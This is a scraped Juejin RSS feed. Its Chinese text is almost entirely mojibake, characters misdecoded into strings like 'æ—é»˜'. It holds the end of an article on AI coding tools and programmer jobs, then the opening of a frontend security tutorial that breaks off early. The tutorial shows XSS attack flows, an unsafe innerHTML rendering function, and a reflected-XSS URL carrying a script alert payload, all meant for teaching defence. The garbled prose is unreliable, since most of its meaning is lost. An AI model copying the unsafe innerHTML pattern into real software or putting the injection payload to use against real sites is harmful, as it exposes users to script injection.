<p>æ—é»˜ç„¶çš„èŒä¸šå›°å¢ƒï¼Œæ°æ°å°è¯äº†å¤§æ¨¡å‹ç¼–ç¨‹èƒ½åŠ›æå‡çš„æ‚–è®ºã€‚ç¼–ç¨‹ä½œä¸ºè®¡ç®—æœºç§‘å­¦çš„åŸºç¡€ï¼Œå…¶å‘å±•å²è´¯ç©¿äº†æ•´ä¸ªäº’è”ç½‘æ—¶ä»£ã€‚</p>
<p>ä»äºŒè¿›åˆ¶æŒ‡ä»¤åˆ°æœºå™¨è¯­è¨€ï¼Œä»æ±‡ç¼–ç³»ç»Ÿåˆ°C/Pythonç­‰é«˜çº§è¯­è¨€ï¼Œç¼–ç¨‹å·¥å…·çš„æ¼”è¿›å·²æŒç»­æ•°åå¹´ã€‚2021å¹´OpenAIæ¨å‡ºçš„Codexç³»ç»Ÿï¼Œé¦–æ¬¡å®ç°äº†é€šè¿‡è‡ªç„¶è¯­è¨€ç”ŸæˆåŸºç¡€ä»£ç ï¼Œæ ‡å¿—ç€AIç¼–ç¨‹æ—¶ä»£çš„å¼€å¯ã€‚</p>
<p>æ­¤åï¼ŒDevinã€CodeFuseã€GitHub Copilotç­‰"AIç¨‹åºå‘˜"äº§å“å‘ˆçˆ†å‘å¼å¢é•¿ã€‚CoderPadè°ƒæŸ¥æ˜¾ç¤ºï¼Œè¶…80%å¼€å‘è€…å·²ä½¿ç”¨AIç¼–ç¨‹å·¥å…·ï¼ŒCSDNæ•°æ®åˆ™è¡¨æ˜35%å¼€å‘è€…æ¯æ—¥ä¾èµ–ä»£ç ç”Ÿæˆï¼Œå…¶ä¸­36%è®¤ä¸ºæ•ˆç‡è·å¾—æ˜¾è‘—æå‡ã€‚</p>
<p>ä¸AIåˆ›ä½œå†…å®¹ç›¸æ¯”ï¼Œç¼–ç¨‹èƒ½åŠ›çš„çªç ´æ›´å…·é¢ è¦†æ€§â€”â€”äº’è”ç½‘çš„ç”Ÿäº§ä½“ç³»æœ¬è´¨æ˜¯å»ºç«‹åœ¨ä»£ç ä¹‹ä¸Šçš„ã€‚éœ€æ±‚åˆ†æã€ç³»ç»Ÿæµ‹è¯•ã€è¿ç»´ç›‘æ§ç­‰å®Œæ•´æµç¨‹ï¼Œéƒ½å°†å› åŸºç¡€ç¼–ç¨‹çš„å˜é©è€Œé‡æ„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3875230999404a008c6561c053edcb77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766391054&amp;x-signature=pnsWNCPA5x3RqnMB0uFXisDnZ20%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ­£å¦‚è‹±ä¼Ÿè¾¾CEOé»„ä»å‹‹æ‰€è¨€ï¼š"ç°åœ¨å…¨çƒäººäººéƒ½æ˜¯ç¨‹åºå‘˜ã€‚"ä¼ ç»Ÿç¼–ç¨‹è¯­è¨€éœ€è¦æ•°åå¹´æ²‰æ·€ï¼Œè€Œå¤§æ¨¡å‹è®©è‡ªç„¶è¯­è¨€ç¼–ç¨‹æˆä¸ºå¯èƒ½ã€‚</p>
<p>CSDNè’‹æ¶›é¢„æµ‹ï¼Œæœªæ¥3-5å¹´å…¨çƒå¼€å‘è€…å°†ä»1äº¿å¢è‡³10äº¿ï¼Œå°†æ¶Œç°å‡ºç±»ä¼¼è‡ªç”±èŒä¸šè€…çš„"è¶…çº§ç¨‹åºå‘˜"ã€‚</p>
<p>ä½†æŠ€æœ¯çº¢åˆ©æ€»ä¼´éšé˜µç—›ã€‚è’‹æ¶›æŒ‡å‡ºï¼š"å¤§æ¨¡å‹é¦–å…ˆä¼šæ›¿ä»£é‡‘å­—å¡”åº•å±‚çš„ä»£ç ç¼–å†™å·¥ä½œï¼Œå¸‚åœºå°†æ›´çœ‹é‡æ¶æ„è®¾è®¡ç­‰é«˜å±‚èƒ½åŠ›ã€‚"Motherboardå¯¹9388åå·¥ç¨‹å¸ˆçš„è°ƒæŸ¥æ˜¾ç¤ºï¼Œ66%è®¤ä¸ºæ±‚èŒéš¾åº¦å¢åŠ ï¼Œè¡Œä¸šæ™®éé¢„æœŸç¨‹åºå‘˜å²—ä½å°†ç¼©å‡ã€‚</p>
<p>ç¡…è°·å…¬å¸å·²å‘ˆç°å…¸å‹ç‰¹å¾ï¼šMidjourney(11äºº)ã€Magnific AI(2äºº)ã€Sora(13äºº)ç­‰å›¢é˜Ÿæåº¦ç²¾ç®€ï¼Œä½†å¤–åŒ…è§„æ¨¡æ˜¾è‘—æ‰©å¤§ã€‚CoderPadæ•°æ®æ˜¾ç¤ºï¼Œ60%ä¼ä¸šé‡‡ç”¨ä¸´æ—¶å·¥å¡«è¡¥æŠ€æœ¯ç¼ºå£ï¼ŒMidjourneyçš„å¤–åŒ…å›¢é˜Ÿè¾¾60ä½™äººã€‚</p>
<p>è¿™ç§æ›¿ä»£å¹¶éæ–°é²œäº‹ã€‚25å¹´å‰è’‹æ¶›åˆ›å»ºCSDNæ—¶ï¼Œåˆä»£ç¨‹åºå‘˜è¿˜éœ€æ‰‹åŠ¨ç»˜åˆ¶ç•Œé¢çª—å£ã€‚"ç¨‹åºå‘˜èŒä¸šå§‹ç»ˆå¤„äºè‡ªåŠ¨åŒ–è¿›ç¨‹ä¸­ï¼Œ"è’‹æ¶›å¦è¨€ï¼Œ"è¿‡å»æ˜¯æ¡†æ¶è§£æ”¾ç”Ÿäº§åŠ›ï¼Œç°åœ¨å¤§æ¨¡å‹è¿æ¡†æ¶åº”ç”¨èƒ½åŠ›éƒ½æ¥ç®¡äº†ã€‚"</p>
<p>90åå·¥ç¨‹å¸ˆè‹å¥‡çš„æ€åº¦é¢‡å…·ä»£è¡¨æ€§ï¼š"AIèƒ½æå‡é‡å¤æ€§å·¥ä½œï¼ˆå¦‚IDL/POJOä»£ç ï¼‰çš„æ•ˆç‡ï¼Œä½†æµ‹è¯•ã€å‰ç«¯ç­‰ä½å£å’å²—ä½æœ€å±é™©ã€‚"ä»–çš„æ·±å±‚ç„¦è™‘åœ¨äºï¼š"å¦‚æœè¡Œä¸šæœ€ç»ˆåªä¿ç•™30%é¡¶å°–å¼€å‘è€…ï¼Œæ–°æ‰‹å¦‚ä½•åˆ¤æ–­è‡ªå·±èƒ½å¦è·»èº«å‰æ’ï¼Ÿ"</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90da6f7c05e84c39a218347002a70798~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766391054&amp;x-signature=4Fk0t5tFykJYrNrEZFrtse1A960%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>03</strong></p>
<p><strong>å¼€å‘è€…æ›´å¥½çš„æ—¶ä»£ï¼Ÿ</strong></p>
<p>æŠ€æœ¯å¼€å‘çš„æ ¸å¿ƒå›¢é˜Ÿè§„æ¨¡æ­£æŒç»­ç²¾ç®€ï¼Œä¼ ç»Ÿäº’è”ç½‘æ—¶ä»£ä¾èµ–äººåŠ›å †å çš„å¼€å‘æ¨¡å¼ï¼Œåœ¨å¤§æ¨¡å‹æ—¶ä»£å·²å¤±å»æ•ˆèƒ½ã€‚</p>
<p>å¤§æ¨¡å‹ä½œä¸ºäº’è”ç½‘ä½“ç³»ä¹‹å¤–çš„å…¨æ–°åŸºç¡€è®¾æ–½ï¼Œå…¶ä¸Šçš„ç”Ÿäº§é€»è¾‘å’Œç»„ç»‡æ¶æ„äºŸå¾…é‡æ„ã€‚ä¾‹å¦‚"èºä¸é’‰"è¿™ä¸€äº’è”ç½‘æ—¶ä»£çš„èŒä¸šæ ‡ç­¾ï¼Œé™ˆå¯è®¤ä¸ºå°†é€æ¸é€€å‡ºæŠ€æœ¯é¢†åŸŸã€‚</p>
<p>"å³ä¾¿æœªæ¥ä¸šåŠ¡æ‰©å±•ï¼Œæˆ‘ä»¬çš„æŠ€æœ¯å›¢é˜Ÿè§„æ¨¡ä¹Ÿä¸ä¼šæ€¥å‰§è†¨èƒ€ã€‚ä»»ä½•å¤§æ¨¡å‹æœºæ„è‹¥å‡ºç°äººå‘˜æš´å¢ï¼Œéƒ½å¯èƒ½æ˜¯å¼‚å¸¸ä¿¡å·ã€‚"è’‹æ¶›æŒæœ‰ç›¸ä¼¼è§‚ç‚¹ã€‚</p>
<p>å°½ç®¡è¿‡å»ä¸‰åå¹´äº’è”ç½‘ç”Ÿæ€çš„æ„å»ºç¦»ä¸å¼€æ¯ä½ç¨‹åºå‘˜çš„ä»£ç è´¡çŒ®ï¼Œä½†è’‹æ¶›æŒ‡å‡ºï¼š"ç¨‹åºå‘˜ç¾¤ä½“æ°æ°æˆä¸ºè½¯ä»¶å¼€å‘æ•ˆç‡çš„ç“¶é¢ˆâ€”â€”ç¼ºä¹ç¼–ç¨‹çŸ¥è¯†çš„äººéš¾ä»¥å°†åˆ›æ„è½åœ°ï¼Œå¯¼è‡´å¼€å‘è€…æ•°é‡é•¿æœŸä¾›ä¸åº”æ±‚ã€‚</p>
<p>å¯¹ä¼ä¸šè€Œè¨€ï¼Œè¯„ä¼°å¼€å‘æˆæœ¬åï¼Œè®¸å¤šåˆ›æ–°é¡¹ç›®æœ€ç»ˆè¢«æ”¾å¼ƒã€‚"æ¨æ¤éºŸåœ¨è…¾è®¯è®¿è°ˆä¸­è°ˆåŠï¼Œè‹¥Sam Altmanåœ¨å¾®è½¯ä½“ç³»å†…é¢†å¯¼AIå›¢é˜Ÿï¼Œå°†é¢ä¸´"åœ¨æ—§æ–‡åŒ–ä¸­åŸ¹è‚²æ–°ç»„ç»‡"çš„ç»“æ„æ€§éš¾é¢˜ã€‚</p>
<p>å…·æœ‰ä¸­ç¾å¤§å‚ä»ä¸šç»å†çš„è‹å¥‡è§‚å¯Ÿåˆ°ï¼Œå›½å†…äº’è”ç½‘ä¼ä¸šæ™®éè¿½æ±‚"é€Ÿèµ¢äººæ‰"ï¼š"å¼€å±•æ–°ä¸šåŠ¡æ—¶ï¼Œä¼ä¸šå€¾å‘äºç›´æ¥æŒ–è§’ç«å¯¹èµ„æ·±å‘˜å·¥ï¼Œæœ€å¥½èƒ½æºå¸¦ç°æˆæ–¹æ¡ˆã€‚è¿™å¯¼è‡´è¡Œä¸šæŠ€æœ¯æ¶æ„é«˜åº¦åŒè´¨åŒ–â€”â€”æœç´¢æ¡†æ¶æ¨¡ä»¿ç™¾åº¦ï¼Œäº¤æ˜“ç³»ç»Ÿå¤åˆ¶é˜¿é‡Œã€‚"</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5feb222288e345e88c261e8920040fd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766391054&amp;x-signature=UHGmHi6rvv2shPy%2BvIrz5zjtYvs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™ç§æ¨¡å¼è™½èƒ½å¿«é€Ÿæ‰©å¼ ï¼Œä½†ç›¸æ¯”åœ°æ¨è§„æ¨¡ã€è¡¥è´´åŠ›åº¦ç­‰è¿è¥æŒ‡æ ‡ï¼ŒæŠ€æœ¯ä¼˜åŠ¿åè€Œé€€å±…å…¶æ¬¡ã€‚</p>
<p>å—è®¿è€…æ™®éè®¤ä¸ºï¼Œå¤§æ¨¡å‹å°†é¢ è¦†äº’è”ç½‘æ—¶ä»£çš„ç”Ÿäº§é€»è¾‘ã€‚æ¢…æ¶›å¯¹æ¯”AIå››å°é¾™æ—¶ä»£æŒ‡å‡ºï¼š"ä¼ ç»ŸAIé¡¹ç›®æ¯”æ‹¼çš„æ˜¯ç»¼åˆè§£å†³æ–¹æ¡ˆèƒ½åŠ›ï¼Œå¦‚ä¸åŒåœºæ™¯çš„äººè„¸è¯†åˆ«éœ€å®šåˆ¶å¼€å‘ï¼Œå¯¼è‡´ä¼ä¸šé™·å…¥'é¡¹ç›®-äººåŠ›'çš„æ¶æ€§å¾ªç¯ã€‚è€Œå¤§æ¨¡å‹æ˜¯è‡ªé—­ç¯æŠ€æœ¯ï¼Œæ— éœ€ä¾èµ–å¤§é‡äº¤ä»˜äººå‘˜ã€‚"</p>
<p>é™ˆå¯å¸¸è¢«æŠ•èµ„äººé—®åŠ"æ‰€å±è¡Œä¸š"ï¼Œä»–å¿…é¡»åå¤è§£é‡Šï¼š"å¤§æ¨¡å‹æ¨¡ç³Šäº†è¡Œä¸šè¾¹ç•Œï¼Œæœè£…è®¾è®¡ä¸å»ºç­‘è®¾è®¡åœ¨è®¡ç®—å±‚é¢å·²æ— æœ¬è´¨å·®å¼‚ã€‚"</p>
<p>ã€Šäººæœˆç¥è¯ã€‹çš„å¯ç¤ºåœ¨é™ˆå¯åˆ›ä¸šåæ„ˆå‘æ·±åˆ»ã€‚ä¹¦ä¸­æ­ç¤ºçš„"ç„¦æ²¹å‘"ç°è±¡â€”â€”å›¢é˜Ÿè§„æ¨¡æ‰©å¤§å¯¼è‡´ç®¡ç†æˆæœ¬æŒ‡æ•°çº§å¢é•¿ã€‚</p>
<p>åœ¨å¤§æ¨¡å‹æ—¶ä»£è·å¾—æ–°æ³¨è§£ï¼š"ä¼ ç»Ÿå¼€å‘ä¸­ï¼Œæ¯4åå¼€å‘è€…éœ€é…ç½®2åæµ‹è¯•ã€1åPMå’Œ2åäº§å“ç»ç†ï¼Œç ”å‘å æ¯”ä¸è¶³30%ã€‚è¿™ç§è‡ƒè‚¿ç»“æ„æ‰¼æ€äº†åˆ›æ–°ç©ºé—´ã€‚"</p>
<p>è‹å¥‡å¯¹ä¹¦ä¸­"success without applause"çš„è®ºè¿°æ„ŸåŒèº«å—ï¼š"å¼€å‘è€…ä»·å€¼å¾€å¾€å–å†³äºè‡ªæˆ‘é©±åŠ¨ï¼Œå¤šæ•°äººå®åˆ™æ˜¯ç³»ç»Ÿé½¿è½®ã€‚"</p>
<p>ä»–äº²å†çš„èŒåœºæ€ªåœˆæ˜¯ï¼šæ–¹æ¡ˆAæ”¹Bé€ å°±æ™‹å‡æ½®ï¼ŒBæ”¹Aåˆè¿æ¥æ–°è½®æ™‹å‡ã€‚"æŠ€æœ¯äººå¸¸å°†ç®€å•é—®é¢˜å¤æ‚åŒ–ä»¥äº‰å–èµ„æºï¼Œæœ€ç»ˆäº§å‡ºè¿è‡ªå·±éƒ½ä¸ä½¿ç”¨çš„äº§å“ã€‚"</p>
<p>å°½ç®¡ç¡¬ä»¶å’Œå·¥å…·å·²è¿­ä»£æ•°åå¹´ï¼Œã€Šäººæœˆç¥è¯ã€‹æ­ç¤ºçš„è½¯ä»¶å·¥ç¨‹å›°å¢ƒä¾ç„¶å­˜åœ¨ï¼šå¼€å‘è€…æ— æ³•æŒæ§å·¥ä½œç›®æ ‡ï¼Œé¡¹ç›®æ»åæ—¶åªèƒ½è¢«åŠ¨åŠ ç­æˆ–å¢å‘˜ã€‚</p>
<p>GPT5.2å‘å¸ƒåï¼Œæ—é»˜ç„¶ä»åšä¿¡AIçš„å˜é©æ½œåŠ›ï¼Œä½†è´¨ç–‘"AIè£å‘˜"çš„çœŸå®æ€§ï¼š"è¢«æ›¿ä»£çš„å²—ä½å¾ˆå¿«è¢«æ–°äººå¡«è¡¥ï¼Œè¿™æœ¬è´¨æ˜¯äººåŠ›èµ„æºç­–ç•¥çš„åŒ…è£…ã€‚"</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a97a65b7eb3f4e70b2bc372d6f41e591~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766391054&amp;x-signature=10iz19ZEF2WbVQ9vXbD%2FYBj6jl8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ³¨ï¼šæ–‡ä¸­äººåå‡ä¸ºæ˜“å</p>
<p><strong>æ›´å¤šAIå¤§æ¨¡å‹å­¦ä¹ è§†é¢‘åŠèµ„æºï¼Œéƒ½åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[XSSã€CSRFã€CSPã€HttpOnly å…¨æ‰«ç›²ï¼šå‰ç«¯å®‰å…¨ä¸åªæ˜¯åç«¯çš„äº‹]]></title>    <link>https://juejin.cn/post/7583615094363193398</link>    <guid>https://juejin.cn/post/7583615094363193398</guid>    <pubDate>2025-12-15T08:13:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583615094363193398" data-draft-id="7583845695196790838" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="XSSã€CSRFã€CSPã€HttpOnly å…¨æ‰«ç›²ï¼šå‰ç«¯å®‰å…¨ä¸åªæ˜¯åç«¯çš„äº‹"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-15T08:13:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            XSSã€CSRFã€CSPã€HttpOnly å…¨æ‰«ç›²ï¼šå‰ç«¯å®‰å…¨ä¸åªæ˜¯åç«¯çš„äº‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T08:13:58.000Z" title="Mon Dec 15 2025 08:13:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å‰ç«¯å®‰å…¨è¿™äº‹ï¼Œå¾ˆå¤šäººè§‰å¾—æ˜¯åç«¯çš„æ´»ï¼Œæˆ–è€…è§‰å¾—è‡ªå·±çš„é¡¹ç›®æ²¡é‚£ä¹ˆé‡è¦ä¸ä¼šè¢«æ”»å‡»ã€‚ä½†ç°å®æ˜¯ï¼ŒXSSã€CSRF è¿™äº›æ¼æ´åœ¨é‡å¤–å¤ªå¸¸è§äº†ï¼Œè€Œä¸”å¾ˆå¤šæ—¶å€™æ”»å‡»è€…å°±æ˜¯ç”¨è‡ªåŠ¨åŒ–å·¥å…·æ‰«çš„ï¼Œä¸æŒ‘é¡¹ç›®å¤§å°ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« æŠŠå‰ç«¯å¸¸è§çš„å®‰å…¨é—®é¢˜æ‹ä¸€éï¼Œæ¯ä¸ªé—®é¢˜è®²æ¸…æ¥šåŸç†ã€æ”»å‡»æ–¹å¼å’Œé˜²æŠ¤æ‰‹æ®µã€‚</p>
<hr/>
<h2 data-id="heading-0">XSSï¼šæœ€å¸¸è§çš„å‰ç«¯æ¼æ´</h2>
<p>XSSï¼ˆCross-Site Scriptingï¼Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰çš„æ ¸å¿ƒå°±æ˜¯æŠŠæ¶æ„è„šæœ¬æ³¨å…¥åˆ°ç½‘é¡µé‡Œï¼Œè®©æµè§ˆå™¨æŠŠå®ƒå½“æ­£å¸¸ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥å· Cookieã€åŠ«æŒä¼šè¯ã€é’“é±¼ã€ç”šè‡³å‘èµ·è •è™«æ”»å‡»ã€‚</p>
<h3 data-id="heading-1">ä¸‰ç§å¸¸è§ç±»å‹</h3>
<p>ä¸‰ç§ XSS çš„æ”»å‡»é“¾è·¯é•¿è¿™æ ·ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph å­˜å‚¨å‹XSS
        A1[æ”»å‡»è€…æäº¤æ¶æ„è¯„è®º] --&gt; A2[æ¶æ„ä»£ç å­˜å…¥æ•°æ®åº“]
        A2 --&gt; A3[ç”¨æˆ·è®¿é—®é¡µé¢]
        A3 --&gt; A4[æœåŠ¡å™¨è¿”å›å«æ¶æ„ä»£ç çš„é¡µé¢]
        A4 --&gt; A5[æµè§ˆå™¨æ‰§è¡Œæ¶æ„è„šæœ¬]
    end

    subgraph åå°„å‹XSS
        B1[æ”»å‡»è€…æ„é€ æ¶æ„URL] --&gt; B2[è¯±å¯¼ç”¨æˆ·ç‚¹å‡»]
        B2 --&gt; B3[æœåŠ¡å™¨å°†å‚æ•°åå°„åˆ°é¡µé¢]
        B3 --&gt; B4[æµè§ˆå™¨æ‰§è¡Œæ¶æ„è„šæœ¬]
    end

    subgraph DOMå‹XSS
        C1[æ”»å‡»è€…æ„é€ æ¶æ„URL] --&gt; C2[è¯±å¯¼ç”¨æˆ·ç‚¹å‡»]
        C2 --&gt; C3[å‰ç«¯JSè¯»å–URLå‚æ•°]
        C3 --&gt; C4[ç›´æ¥æ“ä½œDOMæ’å…¥æ¶æ„ä»£ç ]
        C4 --&gt; C5[æµè§ˆå™¨æ‰§è¡Œæ¶æ„è„šæœ¬]
    end
</code></pre>
<p><strong>å­˜å‚¨å‹ XSS</strong></p>
<p>æ¶æ„ä»£ç è¢«å­˜åˆ°æ•°æ®åº“é‡Œï¼Œæ¯æ¬¡è®¿é—®éƒ½ä¼šæ‰§è¡Œã€‚æ¯”å¦‚è®ºå›çš„è¯„è®ºåŠŸèƒ½ï¼Œæ”»å‡»è€…æäº¤ä¸€æ¡åŒ…å«æ¶æ„è„šæœ¬çš„è¯„è®ºï¼Œå…¶ä»–ç”¨æˆ·ä¸€çœ‹è¯„è®ºå°±ä¸­æ‹›ã€‚è¿™ç§å±å®³æœ€å¤§ï¼Œå½±å“æ‰€æœ‰è®¿é—®è¯¥é¡µé¢çš„ç”¨æˆ·ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å±é™©çš„å†™æ³•</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">renderComment</span>(<span class="hljs-params">comment</span>) {
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'comment'</span>).<span class="hljs-property">innerHTML</span> = comment.<span class="hljs-property">content</span>;
}
</code></pre>
<p><strong>åå°„å‹ XSS</strong></p>
<p>æ¶æ„ä»£ç åœ¨ URL å‚æ•°é‡Œï¼ŒæœåŠ¡å™¨æŠŠå‚æ•°åŸæ ·è¿”å›åˆ°é¡µé¢ã€‚å¸¸è§äºæœç´¢åŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// URL: https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</span>

<span class="hljs-comment">// æœåŠ¡å™¨è¿”å›</span>
&lt;div&gt;æœç´¢ç»“æœï¼š&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">'XSS'</span>)&lt;<span class="hljs-regexp">/script&gt;&lt;/</span>div&gt;
</code></pre>
